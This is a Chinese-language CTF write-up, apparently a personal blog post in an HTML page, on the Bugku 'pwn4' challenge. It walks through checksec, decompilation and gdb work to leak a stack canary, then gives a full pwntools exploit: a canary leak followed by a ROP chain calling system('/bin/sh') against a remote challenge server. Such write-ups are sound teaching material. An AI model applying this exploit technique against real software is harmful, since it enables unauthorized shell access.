@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>再战canary--尝试使用gdb | nianchu</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://cc-nianchu.github.io/favicon.ico?v=1626862724459">
+<link rel="stylesheet" href="https://cc-nianchu.github.io/styles/main.css">
+
+
+  
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/disqusjs@1.1/dist/disqusjs.css" />
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="题目为bugku pwn4
+先checksec一下看有什么保护和啥类型程序
+pwndbg&gt; checksec
+[*] '/home/nianchu/Desktop/bugku/pwn4'
+    Arch:     amd64-64-..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://cc-nianchu.github.io">
+        <img src="https://cc-nianchu.github.io/images/avatar.png?v=1626862724459" class="site-logo">
+        <h1 class="site-title">nianchu</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      nianchu的blog
+    </div>
+    <div class="site-footer">
+      Powered by <a >nianchu</a> | <a class="rss" href="https://cc-nianchu.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">再战canary--尝试使用gdb</h2>
+            <div class="post-date">2021-07-21</div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="题目为bugku-pwn4">题目为bugku pwn4</h2>
+<p>先checksec一下看有什么保护和啥类型程序</p>
+<pre><code>pwndbg&gt; checksec
+[*] '/home/nianchu/Desktop/bugku/pwn4'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<p>发现有Canary和NX保护，使用IDA64查看题目文件按F5反编译得伪代码</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[48]; // [rsp+10h] [rbp-240h] BYREF
+  char v5[520]; // [rsp+40h] [rbp-210h] BYREF
+  unsigned __int64 v6; // [rsp+248h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  init();
+  write(1, &quot;Welcome!\n&quot;, 0x10uLL);
+  write(1, &quot;Please leave your name(Within 36 Length):&quot;, 0x29uLL);
+  read(0, buf, 0x300uLL);
+  printf(&quot;Hello %s\n&quot;, buf);
+  write(1, &quot;Please leave a message(Within 0x200 Length):&quot;, 0x2CuLL);
+  read(0, v5, 0x300uLL);
+  printf(&quot;your message is :%s \nBye~&quot;, v5);
+  return 0;
+}
+</code></pre>
+<p><img src="https://cc-nianchu.github.io/post-images/1626860885192.png" alt="" loading="lazy"><br>
+主要关注.text:000000000040082C                 mov     rax, fs:28h<br>
+和.text:0000000000400835                  mov    [rbp+var_8], rax<br>
+<img src="https://cc-nianchu.github.io/post-images/1626861002377.png" alt="" loading="lazy"><br>
+canary存在rbp+var_8，可以在0x40082C下断点，观察下。<br>
+下断点在0x40082C并输入r运行<br>
+<img src="https://cc-nianchu.github.io/post-images/1626861151630.png" alt="" loading="lazy"><br>
+输入n后发现rax的寄存器从0x400814变成0xfd158aa9e4871200<br>
+并且发现rax的值要赋给rbp-8<br>
+canary在内存是这样的<br>
+<img src="https://cc-nianchu.github.io/post-images/1626861272714.png" alt="" loading="lazy"><br>
+所以现在的思路是首先依据第一次回显泄露canary的值，第二次通过利用泄露的canary值实现栈溢出。<br>
+64位程序优先通过寄存器rdi传参，所以先找pop rdi ； ret<br>
+利用命令ROPgadget --binary pwn4_canary --only &quot;pop|rdi|ret&quot;<br>
+可以找到如下结果，我们选择0x400963（选个简单的）<br>
+还差一个/bin/sh我们可以在ida上按shift+F12 找到<br>
+<img src="https://cc-nianchu.github.io/post-images/1626861450260.png" alt="" loading="lazy"><br>
+最终如下<br>
+<img src="https://cc-nianchu.github.io/post-images/1626861486228.jpg" alt="" loading="lazy"><br>
+完整exp：</p>
+<pre><code># -- coding:utf-8 
+from pwn import *
+#p = process(&quot;./pwn4&quot;)
+context.log_level = 'debug'
+p = remote(&quot;114.67.246.176&quot;,15575)
+p.recvuntil(&quot;(Within 36 Length)&quot;)
+payload=&quot;a&quot;*(0x240-0x8) #canary在rbp-8的位置
+p.sendline(payload)
+#0a	12	87	e4	a9	8a	15	fd
+#\n         0a是\n 16进制
+canary_addr=u64('\x00'+p.recv(7)) 
+#system函数地址，用ida可以查
+system_addr = 0x400660
+#ROPgadget --binary pwn4_canary --only &quot;pop|rdi|ret&quot;
+#0x0000000000400963 : pop rdi ; ret
+pop_rdi_ret = 0x400963
+#/bin/sh地址 ida shift+F12可获得
+binsh_addr =0x601068
+payload ='a'*(0x210-0x8)
+
+payload += p64(canary_addr)
+#rbp
+payload += p64(0x1)
+
+payload += p64(pop_rdi_ret)
+
+payload += p64(binsh_addr)
+
+payload += p64(system_addr)
+
+p.recv()
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>最后来个笔记<br>
+<img src="https://cc-nianchu.github.io/post-images/1626862721188.jpg" alt="" loading="lazy"></p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://cc-nianchu.github.io/post/dynelf/">
+                  <h3 class="post-title">
+                    DynELF
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+
+              
+                <div id="disqus_thread" data-aos="fade-in"></div>
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+
+  
+    <script src="https://unpkg.com/disqusjs@1.1/dist/disqus.js"></script>
+    <script>
+
+    var options = {
+      shortname: '',
+      apikey: '',
+    }
+    if ('') {
+      options.api = ''
+    }
+    var dsqjs = new DisqusJS(options)
+
+    </script>
+  
+
+
+
+
+  </body>
+</html>
